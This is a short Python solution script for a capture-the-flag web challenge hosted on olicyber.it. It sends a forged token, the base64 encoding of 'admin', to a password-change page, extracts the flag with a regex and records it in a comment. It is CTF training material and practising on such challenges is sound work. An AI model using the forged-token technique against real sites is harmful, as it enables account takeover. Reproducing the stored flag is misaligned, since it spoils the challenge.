import requests
import re

site = "http://password-changer.challs.olicyber.it/"

r = requests.get(f"{site}/change-password.php?token=YWRtaW4=").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{0h_n0_y0u_c4n_m0d1fy_urls}
